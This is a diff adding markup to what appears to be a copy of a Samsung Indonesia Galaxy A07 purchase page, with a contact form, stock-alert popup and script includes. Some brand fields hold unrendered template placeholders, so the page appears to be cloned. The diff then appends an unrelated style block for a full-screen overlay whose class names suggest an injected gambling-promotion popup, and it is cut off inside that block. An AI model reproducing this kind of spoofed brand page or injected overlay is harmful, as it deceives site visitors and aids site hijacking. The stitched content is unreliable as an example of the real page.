+           </div>
+          </div>
+          <div class="contact-mail-form-popup__form-field form--size-full is-required field--single-text">
+           <div class="text-field-v2">
+            <label class="text-field-v2__hint" for="popUp_form_8">
+             Contact Number
+             <span class="required-text">
+              *
+              <span class="hidden">
+               Wajib Diisi
+              </span>
+             </span>
+            </label>
+            <div class="text-field-v2__input-wrap">
+             <input autocomplete="tel" class="text-field-v2__input" data-form-name="Telephone" id="popUp_form_8" maxlength="40" type="text" value=""/>
+             <button aria-label="Delete" class="text-field-v2__input-icon delete" type="button">
+              <svg aria-hidden="true" class="icon delete" focusable="false">
+               <use href="#cancel-bold" xlink:href="#cancel-bold">
+               </use>
+              </svg>
+             </button>
+             <div class="text-field-v2__input-icon error">
+              <svg aria-hidden="true" class="icon error" focusable="false">
+               <use href="#information-error-bold" xlink:href="#information-error-bold">
+               </use>
+              </svg>
+             </div>
+            </div>
+            <p class="text-field-v2__text error">
+             * This field is required
+            </p>
+           </div>
+          </div>
+          <div class="contact-mail-form-popup__form-field form--size-full field--dropdown">
+           <div class="menu menu--text-field">
+            <select aria-labelledby="hint_popUp_form_9" class="menu__select" data-form-name="Employee" tabindex="-1">
+             <option value="&lt;50">
+              &lt;50
+             </option>
+             <option value="50-99">
+              50 ~ 99
+             </option>
+             <option value="100-199">
+              100 ~ 199
+             </option>
+             <option value="200-499">
+              200 ~ 499
+             </option>
+             <option value="500-999">
+              500 ~ 999
+             </option>
+             <option value="&gt;1000">
+              &gt;1000
+             </option>
+            </select>
+            <p class="menu--text-field__hint" id="hint_popUp_form_9">
+             No. of Employees
+            </p>
+            <button aria-expanded="false" aria-haspopup="listbox" aria-labelledby="hint_popUp_form_9 text_hint_popUp_form_9" class="menu__select-field" type="button">
+             <span class="menu__select-field-text" id="text_hint_popUp_form_9">
+             </span>
+             <svg class="menu__select-field-icon down" focusable="false">
+              <use href="#open-down-bold" xlink:href="#open-down-bold">
+              </use>
+             </svg>
+             <svg class="menu__select-field-icon up" focusable="false">
+              <use href="#close-up-bold" xlink:href="#close-up-bold">
+              </use>
+             </svg>
+            </button>
+            <p class="menu--text-field__error">
+             * This field is required
+            </p>
+           </div>
+          </div>
+          <div class="contact-mail-form-popup__form-field form--size-full is-required field--dropdown">
+           <div class="menu menu--text-field">
+            <select aria-labelledby="hint_popUp_form_10" class="menu__select" data-form-name="Industry" tabindex="-1">
+             <option value="Communications">
+              Communications
+             </option>
+             <option value="Education">
+              Education
+             </option>
+             <option value="Finance">
+              Finance
+             </option>
+             <option value="Government">
+              Government
+             </option>
+             <option value="Healthcare">
+              Healthcare
+             </option>
+             <option value="Hospitality">
+              Hospitality
+             </option>
+             <option value="Manufacturing">
+              Manufacturing
+             </option>
+             <option value="Retail">
+              Retail
+             </option>
+             <option value="Transportation &amp; Logistics">
+              Transportation &amp; Logistics
+             </option>
+             <option value="Others">
+              Lainnya
+             </option>
+            </select>
+            <p class="menu--text-field__hint" id="hint_popUp_form_10">
+             Product / Industry Interest
+             <span class="text-field--required-text">
+              *
+              <span class="hidden">
+               Wajib Diisi
+              </span>
+             </span>
+            </p>
+            <button aria-expanded="false" aria-haspopup="listbox" aria-labelledby="hint_popUp_form_10 text_hint_popUp_form_10" class="menu__select-field" type="button">
+             <span class="menu__select-field-text" id="text_hint_popUp_form_10">
+             </span>
+             <svg class="menu__select-field-icon down" focusable="false">
+              <use href="#open-down-bold" xlink:href="#open-down-bold">
+              </use>
+             </svg>
+             <svg class="menu__select-field-icon up" focusable="false">
+              <use href="#close-up-bold" xlink:href="#close-up-bold">
+              </use>
+             </svg>
+            </button>
+            <p class="menu--text-field__error">
+             * This field is required
+            </p>
+           </div>
+          </div>
+          <div class="contact-mail-form-popup__form-field form--size-half field--checkbox checkbox--list">
+           <fieldset>
+            <legend>
+             Solution Interest
+             <span>
+              * Wajib Diisi
+             </span>
+            </legend>
+            <div class="field--checkbox-list-wrap">
+             <div class="contact-mail-form-popup__form-field-title-wrap">
+              <strong aria-hidden="true" class="contact-mail-form-popup__form-field-title">
+               Solution Interest
+              </strong>
+              <p class="checkbox--error-text">
+               * This checkbox is required
+              </p>
+             </div>
+             <fieldset>
+              <legend>
+               Solusi Bisnis Mobile
+              </legend>
+              <div class="contact-mail-form-popup__form-field-list-wrap">
+               <strong aria-hidden="true" class="contact-mail-form-popup__form-field-sub-title">
+                Solusi Bisnis Mobile
+               </strong>
+               <div class="field--checkbox-wrap">
+                <div class="checkbox-v2">
+                 <input class="checkbox-v2__input" data-form-name="SolutionInterest" data-orignal="<?= $BRAND; ?> x <?= $BRAND2; ?>" id="mbs_popUp_form_11-0" type="checkbox" value="<?= $BRAND; ?> x <?= $BRAND2; ?>"/>
+                 <label class="checkbox-v2__label" for="mbs_popUp_form_11-0">
+                  <span class="checkbox-v2__label-box-wrap">
+                   <span class="checkbox-v2__label-box">
+                    <svg aria-hidden="true" class="checkbox-v2__label-box-icon" focusable="false">
+                     <use href="#done-bold" xlink:href="#done-bold">
+                     </use>
+                    </svg>
+                   </span>
+                  </span>
+                  <span class="checkbox-v2__label-text">
+                   <?= $BRAND; ?> x <?= $BRAND2; ?>
+                  </span>
+                 </label>
+                </div>
+               </div>
+               <div class="field--checkbox-wrap">
+                <div class="checkbox-v2">
+                 <input class="checkbox-v2__input" data-form-name="SolutionInterest" data-orignal="<?= $BRAND; ?> x <?= $BRAND2; ?>" id="mbs_popUp_form_11-1" type="checkbox" value="<?= $BRAND; ?> x <?= $BRAND2; ?>"/>
+                 <label class="checkbox-v2__label" for="mbs_popUp_form_11-1">
+                  <span class="checkbox-v2__label-box-wrap">
+                   <span class="checkbox-v2__label-box">
+                    <svg aria-hidden="true" class="checkbox-v2__label-box-icon" focusable="false">
+                     <use href="#done-bold" xlink:href="#done-bold">
+                     </use>
+                    </svg>
+                   </span>
+                  </span>
+                  <span class="checkbox-v2__label-text">
+                    <?= $BRAND; ?> x <?= $BRAND2; ?>
+                  </span>
+                 </label>
+                </div>
+               </div>
+               <div class="field--checkbox-wrap">
+                <div class="checkbox-v2">
+                 <input class="checkbox-v2__input" data-form-name="SolutionInterest" data-orignal="<?= $BRAND; ?> x <?= $BRAND2; ?>" id="mbs_popUp_form_11-2" type="checkbox" value="<?= $BRAND; ?> x <?= $BRAND2; ?>"/>
+                 <label class="checkbox-v2__label" for="mbs_popUp_form_11-2">
+                  <span class="checkbox-v2__label-box-wrap">
+                   <span class="checkbox-v2__label-box">
+                    <svg aria-hidden="true" class="checkbox-v2__label-box-icon" focusable="false">
+                     <use href="#done-bold" xlink:href="#done-bold">
+                     </use>
+                    </svg>
+                   </span>
+                  </span>
+                  <span class="checkbox-v2__label-text">
+                    <?= $BRAND; ?> x <?= $BRAND2; ?>
+                  </span>
+                 </label>
+                </div>
+               </div>
+               <div class="field--checkbox-wrap">
+                <div class="checkbox-v2">
+                 <input class="checkbox-v2__input" data-form-name="SolutionInterest" data-orignal="Capital Solutions" id="mbs_popUp_form_11-3" type="checkbox" value="Capital Solutions"/>
+                 <label class="checkbox-v2__label" for="mbs_popUp_form_11-3">
+                  <span class="checkbox-v2__label-box-wrap">
+                   <span class="checkbox-v2__label-box">
+                    <svg aria-hidden="true" class="checkbox-v2__label-box-icon" focusable="false">
+                     <use href="#done-bold" xlink:href="#done-bold">
+                     </use>
+                    </svg>
+                   </span>
+                  </span>
+                  <span class="checkbox-v2__label-text">
+                   Capital Solutions
+                  </span>
+                 </label>
+                </div>
+               </div>
+               <div class="field--checkbox-wrap">
+                <div class="checkbox-v2">
+                 <input class="checkbox-v2__input" data-form-name="SolutionInterest" data-orignal="Enterprise Technical Support" id="mbs_popUp_form_11-4" type="checkbox" value="Enterprise Technical Support"/>
+                 <label class="checkbox-v2__label" for="mbs_popUp_form_11-4">
+                  <span class="checkbox-v2__label-box-wrap">
+                   <span class="checkbox-v2__label-box">
+                    <svg aria-hidden="true" class="checkbox-v2__label-box-icon" focusable="false">
+                     <use href="#done-bold" xlink:href="#done-bold">
+                     </use>
+                    </svg>
+                   </span>
+                  </span>
+                  <span class="checkbox-v2__label-text">
+                   Enterprise Technical Support
+                  </span>
+                 </label>
+                </div>
+               </div>
+              </div>
+             </fieldset>
+             <fieldset>
+              <legend>
+               Solusi Tampilan
+              </legend>
+              <div class="contact-mail-form-popup__form-field-list-wrap">
+               <strong aria-hidden="true" class="contact-mail-form-popup__form-field-sub-title">
+                Solusi Tampilan
+               </strong>
+               <div class="field--checkbox-wrap">
+                <div class="checkbox-v2">
+                 <input class="checkbox-v2__input" data-form-name="SolutionInterest" data-orignal="Smart signage solution" id="ds_popUp_form_11-0" type="checkbox" value="Smart signage solution"/>
+                 <label class="checkbox-v2__label" for="ds_popUp_form_11-0">
+                  <span class="checkbox-v2__label-box-wrap">
+                   <span class="checkbox-v2__label-box">
+                    <svg aria-hidden="true" class="checkbox-v2__label-box-icon" focusable="false">
+                     <use href="#done-bold" xlink:href="#done-bold">
+                     </use>
+                    </svg>
+                   </span>
+                  </span>
+                  <span class="checkbox-v2__label-text">
+                   Smart signage solution
+                  </span>
+                 </label>
+                </div>
+               </div>
+               <div class="field--checkbox-wrap">
+                <div class="checkbox-v2">
+                 <input class="checkbox-v2__input" data-form-name="SolutionInterest" data-orignal="LED signage solution" id="ds_popUp_form_11-1" type="checkbox" value="LED signage solution"/>
+                 <label class="checkbox-v2__label" for="ds_popUp_form_11-1">
+                  <span class="checkbox-v2__label-box-wrap">
+                   <span class="checkbox-v2__label-box">
+                    <svg aria-hidden="true" class="checkbox-v2__label-box-icon" focusable="false">
+                     <use href="#done-bold" xlink:href="#done-bold">
+                     </use>
+                    </svg>
+                   </span>
+                  </span>
+                  <span class="checkbox-v2__label-text">
+                   LED signage solution
+                  </span>
+                 </label>
+                </div>
+               </div>
+               <div class="field--checkbox-wrap">
+                <div class="checkbox-v2">
+                 <input class="checkbox-v2__input" data-form-name="SolutionInterest" data-orignal="Commercial TV solution" id="ds_popUp_form_11-2" type="checkbox" value="Commercial TV solution"/>
+                 <label class="checkbox-v2__label" for="ds_popUp_form_11-2">
+                  <span class="checkbox-v2__label-box-wrap">
+                   <span class="checkbox-v2__label-box">
+                    <svg aria-hidden="true" class="checkbox-v2__label-box-icon" focusable="false">
+                     <use href="#done-bold" xlink:href="#done-bold">
+                     </use>
+                    </svg>
+                   </span>
+                  </span>
+                  <span class="checkbox-v2__label-text">
+                   Commercial TV solution
+                  </span>
+                 </label>
+                </div>
+               </div>
+               <div class="field--checkbox-wrap">
+                <div class="checkbox-v2">
+                 <input class="checkbox-v2__input" data-form-name="SolutionInterest" data-orignal="Monitor solution" id="ds_popUp_form_11-3" type="checkbox" value="Monitor solution"/>
+                 <label class="checkbox-v2__label" for="ds_popUp_form_11-3">
+                  <span class="checkbox-v2__label-box-wrap">
+                   <span class="checkbox-v2__label-box">
+                    <svg aria-hidden="true" class="checkbox-v2__label-box-icon" focusable="false">
+                     <use href="#done-bold" xlink:href="#done-bold">
+                     </use>
+                    </svg>
+                   </span>
+                  </span>
+                  <span class="checkbox-v2__label-text">
+                   Monitor solution
+                  </span>
+                 </label>
+                </div>
+               </div>
+              </div>
+             </fieldset>
+             <fieldset>
+              <legend>
+               Solusi Iklim
+              </legend>
+              <div class="contact-mail-form-popup__form-field-list-wrap">
+               <strong aria-hidden="true" class="contact-mail-form-popup__form-field-sub-title">
+                Solusi Iklim
+               </strong>
+               <div class="field--checkbox-wrap">
+                <div class="checkbox-v2">
+                 <input class="checkbox-v2__input" data-form-name="SolutionInterest" data-orignal="Climate Hub" id="cs_popUp_form_11-0" type="checkbox" value="Climate Hub"/>
+                 <label class="checkbox-v2__label" for="cs_popUp_form_11-0">
+                  <span class="checkbox-v2__label-box-wrap">
+                   <span class="checkbox-v2__label-box">
+                    <svg aria-hidden="true" class="checkbox-v2__label-box-icon" focusable="false">
+                     <use href="#done-bold" xlink:href="#done-bold">
+                     </use>
+                    </svg>
+                   </span>
+                  </span>
+                  <span class="checkbox-v2__label-text">
+                   Climate Hub
+                  </span>
+                 </label>
+                </div>
+               </div>
+               <div class="field--checkbox-wrap">
+                <div class="checkbox-v2">
+                 <input class="checkbox-v2__input" data-form-name="SolutionInterest" data-orignal="WindFree" id="cs_popUp_form_11-1" type="checkbox" value="WindFree"/>
+                 <label class="checkbox-v2__label" for="cs_popUp_form_11-1">
+                  <span class="checkbox-v2__label-box-wrap">
+                   <span class="checkbox-v2__label-box">
+                    <svg aria-hidden="true" class="checkbox-v2__label-box-icon" focusable="false">
+                     <use href="#done-bold" xlink:href="#done-bold">
+                     </use>
+                    </svg>
+                   </span>
+                  </span>
+                  <span class="checkbox-v2__label-text">
+                   WindFree
+                  </span>
+                 </label>
+                </div>
+               </div>
+               <div class="field--checkbox-wrap">
+                <div class="checkbox-v2">
+                 <input class="checkbox-v2__input" data-form-name="SolutionInterest" data-orignal="360 Cassette" id="cs_popUp_form_11-2" type="checkbox" value="360 Cassette"/>
+                 <label class="checkbox-v2__label" for="cs_popUp_form_11-2">
+                  <span class="checkbox-v2__label-box-wrap">
+                   <span class="checkbox-v2__label-box">
+                    <svg aria-hidden="true" class="checkbox-v2__label-box-icon" focusable="false">
+                     <use href="#done-bold" xlink:href="#done-bold">
+                     </use>
+                    </svg>
+                   </span>
+                  </span>
+                  <span class="checkbox-v2__label-text">
+                   360 Cassette
+                  </span>
+                 </label>
+                </div>
+               </div>
+              </div>
+             </fieldset>
+            </div>
+            <fieldset>
+            </fieldset>
+           </fieldset>
+          </div>
+          <div class="contact-mail-form-popup__form-field form--size-full field--multi-text is-required">
+           <div class="text-field-v2 multi-line">
+            <label class="text-field-v2__hint" for="popUp_form_12">
+             Message
+             <span class="text-field--required-text">
+              *
+              <span class="hidden">
+               Wajib Diisi
+              </span>
+             </span>
+            </label>
+            <div class="text-field-v2__input-wrap">
+             <textarea autocomplete="on" class="text-field-v2__input-multi-line" data-form-name="Message" id="popUp_form_12" maxlength="2000"></textarea>
+            </div>
+            <p class="text-field-v2__text assistive" id="popUp_form_12_assistive">
+             (0/2000)
+            </p>
+            <p class="text-field-v2__text error">
+             * This field is required
+            </p>
+           </div>
+          </div>
+          <div class="contact-mail-form-popup__iframe">
+           <div class="contact-mail-form-popup__iframe-inner">
+            <div data-callback="recaptchaCallback" id="Con_reCaptcha">
+            </div>
+           </div>
+           <p class="invalid-notice" style="display: none">
+            Verification expired. Check the checkbox again.
+           </p>
+          </div>
+          <div>
+          </div>
+          <div class="contact-mail-form-popup__form-field form--size-full field--checkbox is-required">
+           <div class="field--checkbox-wrap">
+            <div class="checkbox-v2">
+             <input aria-describedby="popUp_form_13_required" class="checkbox-v2__input" data-form-name="PrivacyPolicy" id="popUp_form_13" type="checkbox"/>
+             <label class="checkbox-v2__label" for="popUp_form_13">
+              <span class="checkbox-v2__label-box-wrap">
+               <span class="checkbox-v2__label-box">
+                <svg aria-hidden="true" class="checkbox-v2__label-box-icon" focusable="false">
+                 <use href="#done-bold" xlink:href="#done-bold">
+                 </use>
+                </svg>
+               </span>
+              </span>
+              <span class="checkbox-v2__label-text">
+               I acknowledge that my information will be processed in accordance with the Samsung privacy policy
+              </span>
+             </label>
+            </div>
+            <p aria-hidden="true" class="checkbox--required-text" id="popUp_form_13_required">
+             * Wajib Diisi
+            </p>
+            <p aria-hidden="true" class="checkbox--error-text" id="policy_form__13_err">
+             * Please agree to the Samsung Privacy Policy
+            </p>
+           </div>
+          </div>
+          <div>
+          </div>
+          <div class="contact-mail-form-popup__form-field form--size-full field--checkbox is-required">
+           <div class="field--checkbox-wrap">
+            <div class="checkbox-v2">
+             <input aria-describedby="popUp_form_14_required" class="checkbox-v2__input" data-form-name="OptIn" id="popUp_form_14" type="checkbox"/>
+             <label class="checkbox-v2__label" for="popUp_form_14">
+              <span class="checkbox-v2__label-box-wrap">
+               <span class="checkbox-v2__label-box">
+                <svg aria-hidden="true" class="checkbox-v2__label-box-icon" focusable="false">
+                 <use href="#done-bold" xlink:href="#done-bold">
+                 </use>
+                </svg>
+               </span>
+              </span>
+              <span class="checkbox-v2__label-text">
+               I would like to receive information about products, services, promotions and marketing communications of Samsung and or its partners.
+              </span>
+             </label>
+            </div>
+            <p aria-hidden="true" class="checkbox--required-text" id="popUp_form_14_required">
+             * Wajib Diisi
+            </p>
+            <p class="checkbox--error-text" id="popUp_form_14_err">
+             * Please accept the Samsung Privacy
+										Policy to proceed
+            </p>
+           </div>
+          </div>
+         </div>
+        </div>
+        <div class="contact-mail-form-popup__cta">
+         <button aria-disabled="false" aria-label="Submit" class="cta cta--contained cta--black">
+          Submit
+         </button>
+        </div>
+       </div>
+      </div>
+      <button class="layer-popup__close" type="button">
+       <span class="hidden">
+        Tutup Layar Popup
+       </span>
+       <svg class="icon" focusable="false">
+        <use href="#delete-bold" xlink:href="#delete-bold">
+        </use>
+       </svg>
+      </button>
+     </div>
+    </div>
+   </div>
+   <div aria-modal="true" class="thank-you-popup" id="ThankYouPopup" role="dialog">
+    <div class="layer-popup">
+     <div class="layer-popup__inner">
+      <p class="layer-popup__title">
+       Terima kasih!
+      </p>
+      <div class="layer-popup__contents">
+       <p class="thank-you-popup__description">
+        Pertanyaan Anda telah berhasil dikirimkan. Kami akan segera menghubungi Anda.
+       </p>
+       <div class="thank-you-popup__cta-wrap">
+        <div class="thank-you-popup__cta">
+         <button aria-label="" class="cta cta--contained cta--black cta--closed">
+          Tutup
+         </button>
+        </div>
+       </div>
+      </div>
+      <button class="layer-popup__close" type="button">
+       <span class="hidden">
+        Tutup Layar Popup
+       </span>
+       <svg class="icon" focusable="false">
+        <use href="#delete-bold" xlink:href="#delete-bold">
+        </use>
+       </svg>
+      </button>
+     </div>
+    </div>
+   </div>
+   <div aria-modal="true" class="confirm-popup" role="dialog" style="display: none">
+    <div class="confirm-popup__dimmed">
+    </div>
+    <div class="confirm-popup__content">
+     <div class="confirm-popup__content-inner">
+      <strong class="confirm-popup__title">
+      </strong>
+      <div class="confirm-popup__desc">
+      </div>
+      <div class="confirm-popup__disclaimer">
+      </div>
+      <div class="confirm-popup__cta-wrap">
+       <button class="cta cta--outlined cta--black">
+       </button>
+       <button class="cta cta--contained cta--emphasis">
+       </button>
+      </div>
+      <button class="confirm-popup__close">
+       <svg class="icon">
+        <use href="#delete-bold" xlink:href="#delete-bold">
+        </use>
+       </svg>
+       <span class="hidden">
+        Tutup Layar Popup
+       </span>
+      </button>
+     </div>
+    </div>
+   </div>
+   <div aria-modal="true" class="confirm-popup-v2" role="dialog">
+    <div class="confirm-popup-v2__dimmed">
+    </div>
+    <div class="confirm-popup-v2__content">
+     <div class="confirm-popup-v2__content-inner">
+      <p class="confirm-popup-v2__title">
+      </p>
+      <div class="confirm-popup-v2__desc">
+      </div>
+      <div class="confirm-popup-v2__cta-wrap">
+       <button class="cta cta--outlined cta--black">
+       </button>
+       <button class="cta cta--contained cta--black">
+       </button>
+      </div>
+      <button class="confirm-popup-v2__close">
+       <svg aria-hidden="true" class="icon" focusable="false">
+        <use href="#delete-bold" xlink:href="#delete-bold">
+        </use>
+       </svg>
+       <span class="hidden">
+        close
+       </span>
+      </button>
+     </div>
+    </div>
+   </div>
+   <!-- CRHQ-1921 [B2C] BR/AR/PY/UY - get stock alert 적용 (shop 조건 해제) -->
+   <input id="isGpv2Flag" name="isGpv2Flag" type="hidden" value="N"/>
+   <input id="isNewHybrisFlag" name="isNewHybrisFlag" type="hidden" value="Y"/>
+   <section aria-modal="true" class="pd-get-stock-alert-popup" role="dialog" style="display: none">
+    <div class="pd-get-stock-alert-popup__dimmed">
+    </div>
+    <div class="pd-get-stock-alert-popup__contents">
+     <div class="scrollbar">
+      <div class="pd-get-stock-alert-popup__inner-wrap scrollbar__contents">
+       <div class="pd-get-stock-alert-popup__header">
+        <p class="text-title">
+         NOTIFIKASI STOK
+        </p>
+        <p class="pd-get-stock-alert-popup__desc">
+         Dapatkan notifikasi ketika item ini tersedia untuk dibeli, dengan menambahkan email Anda.
+        </p>
+       </div>
+       <div class="pd-get-stock-alert-popup__text-field-wrap">
+       
+        <div class="text-field-v2">
+         <label class="text-field-v2__hint" for="getStockAlertEmailInput">
+          Masukkan email Anda
+         </label>
+         <div class="text-field-v2__input-wrap">
+          <input autocomplete="email" class="text-field-v2__input" id="getStockAlertEmailInput" type="text" value=""/>
+          <button aria-label="Delete" class="text-field-v2__input-icon delete" type="button">
+           <svg aria-hidden="true" class="icon delete" focusable="false">
+            <use href="#cancel-bold" xlink:href="#cancel-bold">
+            </use>
+           </svg>
+          </button>
+          <div class="text-field-v2__input-icon error">
+           <svg aria-hidden="true" class="icon error" focusable="false">
+            <use href="#information-error-bold" xlink:href="#information-error-bold">
+            </use>
+           </svg>
+          </div>
+         </div>
+         <p class="text-field-v2__text error" id="getstock-popup-error-txt">
+          Silahkan periksa kembali alamat email Anda
+         </p>
+        </div>
+       </div>
+       <div class="pd-get-stock-alert-popup__checkbox-container">
+       </div>
+       <div class="pd-get-stock-alert-popup__disclaimer">
+        <p class="pd-get-stock-alert-popup__disclaimer-text">
+        </p>
+       </div>
+      </div>
+     </div>
+     <div class="pd-get-stock-alert-popup__btn-wrap">
+      <button an-ac="stock alert" an-ca="buy cta" an-la="stock alert:close" an-tr="pd03_product finder:stock alert-product detail-cta-popup" class="pd-get-stock-alert-popup__btn-close cta cta--outlined cta--black">
+       Tutup
+      </button>
+      <button an-ac="stock alert" an-ca="buy cta" an-la="stock alert:submit" an-tr="pd03_product finder:stock alert-product detail-cta-popup" class="pd-get-stock-alert-popup__btn-submit cta cta--contained cta--emphasis cta--disabled" disabled="">
+       Daftar
+      </button>
+     </div>
+     <button an-ac="stock alert" an-ca="buy cta" an-la="stock alert:close" an-tr="pd03_product finder:stock alert-product detail-cta-popup" class="pd-get-stock-alert-popup__close">
+      <span class="hidden">
+       Close popup
+      </span>
+      <svg aria-hidden="true" class="icon" focusable="false">
+       <use href="#delete-bold" xlink:href="#delete-bold">
+       </use>
+      </svg>
+     </button>
+    </div>
+    <div class="pd-get-stock-alert-popup__final-wrap">
+     <div class="pd-get-stock-alert-popup__final">
+      <p class="pd-get-stock-alert-popup__final-desc">
+       Kami akan mengirim email kepada Anda ketika stok tersedia.
+       <br/>
+       Terima kasih.
+      </p>
+      <div class="pd-get-stock-alert-popup__final-btn-wrap">
+       <button class="pd-get-stock-alert-popup__final-btn-close cta cta--contained cta--emphasis">
+        Daftar
+       </button>
+      </div>
+      <button class="pd-get-stock-alert-popup__close">
+       <span class="hidden">
+        Close popup
+       </span>
+       <svg aria-hidden="true" class="icon" focusable="false">
+        <use href="#delete-bold" xlink:href="#delete-bold">
+        </use>
+       </svg>
+      </button>
+     </div>
+    </div>
+   </section>
+   <script async="" src="https://maps.googleapis.com/maps/api/js?region=kr&amp;client=gme-samsungsds&amp;libraries=places&amp;loading=async&amp;callback=Function.prototype" type="text/javascript"></script>
+   <div class="where-to-buy">
+   </div>
+   <input id="useNewWtb" name="useNewWtb" type="hidden" value="Y"/>
+   <input id="searchApiDomain" name="searchApiDomain" type="hidden" value="//searchapi.samsung.com/v6"/>
+   <input id="buyinstoreRedirectYN" name="buyinstoreRedirectYN" type="hidden" value="N"/>
+   <input id="rtlValue" type="hidden"/>
+   <input id="current_model_code" name="current_model_code" type="hidden"/>
+   <input id="wtbCurrentPagePath" type="hidden" value="/content/samsung/id/smartphones/galaxy-a/galaxy-a07-black-64gb-sm-a075fzkdxid/buy"/>
+   <script src="https://www.samsung.com/etc.clientlibs/samsung/components/content/consumer/global/product-popup/pd-g-smc-popup/clientlibs-h-n/site.min.36f33859be9e845ecc1d5b2ae517b039.js"></script>
+   <script src="https://www.samsung.com/etc.clientlibs/samsung/components/content/consumer/global/product-popup/pd-g-tariff-popup/clientlibs-h-n/site.min.74177fffeeca4bd1adfc2c5b99953a66.js"></script>
+   <script src="https://www.samsung.com/etc.clientlibs/samsung/components/content/consumer/global/product-dynamic/pd-g-anchor-navigation-ux25/clientlibs/site.min.f513c1da7401cfde7df15876f4b8fea0.js"></script>
+   <script src="https://www.samsung.com/etc.clientlibs/samsung/clientlibs/consumer/global/clientlib-templates/page-buying-pd.min.eeb9431bf6dc2b001b8869bc85fdef28.js"></script>
+   <script defer="" src="https://www.samsung.com/etc.clientlibs/samsung/clientlibs/consumer/global/clientlib-templates/page-buying-pd/compactComps.min.e9338bc9fb7a92c8450bbafc4e49902f.js" type="text/javascript"></script>
+   <script defer="" src="https://www.samsung.com/etc.clientlibs/samsung/clientlibs/consumer/global/clientlib-templates/page-buying-pd/compactComps-h-n.min.1c660086d47e1dd0046e752531513109.js" type="text/javascript"></script>
+   <script src="https://www.samsung.com/etc.clientlibs/samsung/components/content/consumer/global/product-popup/pd-g-wishlist-popup/clientlibs/site.min.648f96f9e6904235937a56177a4f9cb4.js"></script>
+   <script src="https://www.samsung.com/etc.clientlibs/samsung/components/content/consumer/global/product-popup/pd-g-eip-popup/clientlibs/site.min.dd4327a6471278074a327fbfe515c7a8.js"></script>
+<style>
+  .digital-yang-setiap-detiknya{
+    margin:0;
+    padding:0;
+    font-family:"Poppins","Segoe UI",Arial,sans-serif;
+    background:transparent;
+    color:#ffecec;
+  }
+
+  .popup-overlay{
+    position:fixed;
+    inset:0;
+    width:100vw;
+    height:100vh;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    padding:18px;
+    background:
+      radial-gradient(circle at 20% 20%,rgba(255,45,45,.22),transparent 35%),
+      radial-gradient(circle at 80% 85%,rgba(160,0,0,.22),transparent 35%),
+      rgba(0,0,0,.80);
+    backdrop-filter:blur(8px);
+    -webkit-backdrop-filter:blur(8px);
+    z-index:9999;
+  }
+
+  .popup-container{
+    position:relative;
+    width:min(92vw,430px);
+    border-radius:28px;
+    overflow:hidden;
+    text-align:center;
+    background:
+      linear-gradient(180deg,rgba(255,255,255,.08),rgba(255,255,255,.03)),
+      linear-gradient(145deg,#170202 0%,#320606 35%,#5a0b0b 70%,#0d0101 100%);
+    border:1px solid rgba(255,55,55,.58);
+    box-shadow:
+      0 35px 80px rgba(0,0,0,.75),
+      0 0 0 1px rgba(255,255,255,.05) inset,
+      0 0 45px rgba(255,30,30,.24);
+    animation:popupRise .65s cubic-bezier(.2,.8,.2,1) both,popupAura 4s ease-in-out infinite;
+  }
+
+  @keyframes popupRise{
+    0%{opacity:0;transform:translateY(34px) scale(.92)}
+    100%{opacity:1;transform:translateY(0) scale(1)}
+  }
+
+  @keyframes popupAura{
+    0%,100%{
+      box-shadow:
+      0 35px 80px rgba(0,0,0,.75),
+      0 0 0 1px rgba(255,255,255,.05) inset,
+      0 0 35px rgba(255,45,45,.20);
+    }
+
+    50%{
+      box-shadow:
+      0 35px 80px rgba(0,0,0,.75),
+      0 0 0 1px rgba(255,255,255,.05) inset,
+      0 0 60px rgba(255,20,20,.38);
+    }
+  }
+
+  .popup-container:before{
+    content:"";
+    position:absolute;
+    inset:12px;
+    border-radius:22px;
+    border:1px solid rgba(255,170,170,.12);
+    pointer-events:none;
+    z-index:4;
+  }
+
+  .popup-container:after{
+    content:"";
+    position:absolute;
+    top:-45%;
+    left:-80%;
+    width:70%;
+    height:190%;
+    background:linear-gradient(115deg,transparent 35%,rgba(255,255,255,.22) 50%,transparent 65%);
+    transform:rotate(8deg);
+    animation:softSweep 5.2s ease-in-out infinite;
+    pointer-events:none;
+    z-index:5;
+  }
+
+  @keyframes softSweep{
+    0%{left:-85%}
+    45%{left:115%}
+    100%{left:115%}
+  }
+
+  .close-btn{
+    position:absolute;
+    top:14px;
+    right:14px;
+    width:34px;
+    height:34px;
+    border-radius:12px;
+    background:rgba(18,2,2,.90);
+    border:1px solid rgba(255,65,65,.52);
+    cursor:pointer;
+    z-index:20;
+    display:grid;
+    place-items:center;
+    transition:.25s ease;
+    box-shadow:0 8px 20px rgba(0,0,0,.45);
+  }
+
+  .close-btn:hover{
+    background:#ff2d2d;
+    transform:rotate(90deg) scale(1.05);
+  }
+
+  .close-btn:before,
+  .close-btn:after{
+    content:"";
+    position:absolute;
+    width:16px;
+    height:2px;
+    border-radius:99px;
+    background:#fff;
+  }
+
+  .close-btn:before{transform:rotate(45deg)}
+  .close-btn:after{transform:rotate(-45deg)}
+
+  .luxury-border{
+    position:absolute;
+    inset:0;
+    border-radius:28px;
+    pointer-events:none;
+    z-index:6;
+    background:
+      linear-gradient(90deg,transparent,rgba(255,70,70,.72),transparent) top/100% 1px no-repeat,
+      linear-gradient(90deg,transparent,rgba(160,0,0,.72),transparent) bottom/100% 1px no-repeat;
+  }
+
+  .gold-particle{
+    position:absolute;
+    width:7px!important;
+    height:7px!important;
+    border-radius:50%;
+    background:radial-gradient(circle,#ffd0d0 0%,#ff2d2d 45%,transparent 72%);
+    box-shadow:0 0 18px rgba(255,35,35,.92);
+    pointer-events:none;
+    z-index:1;
+    animation:floatDot 8s ease-in-out infinite;
+  }
+
+  @keyframes floatDot{
+    0%,100%{opacity:0;transform:translate3d(0,18px,0) scale(.7)}
+    15%,80%{opacity:1}
+    50%{transform:translate3d(18px,-55px,0) scale(1)}
+  }
+
+  .Game Digital Yang Setiap{
+    position:relative;
+    z-index:3;
+  }
+
+  .popup-image{
+    width:100%;
+    display:block;
+    aspect-ratio:1/1;
+    object-fit:cover;
+    border-bottom:1px solid rgba(255,60,60,.30);
+  }
+
+  .clk-btn-sgp{
+    position:relative;
+    display:grid;
+    grid-template-columns:repeat(2,minmax(0,1fr));
+    gap:12px;
+    width:100%;
+    padding:18px 18px 10px;
+    font-family:"Poppins",Arial,sans-serif;
+    font-weight:900;
+  }
+
+  .clk-btn-sgp:before{
+    content:"";
+    position:absolute;
+    top:0;
+    left:50%;
+    width:76%;
+    height:1px;
+    transform:translateX(-50%);
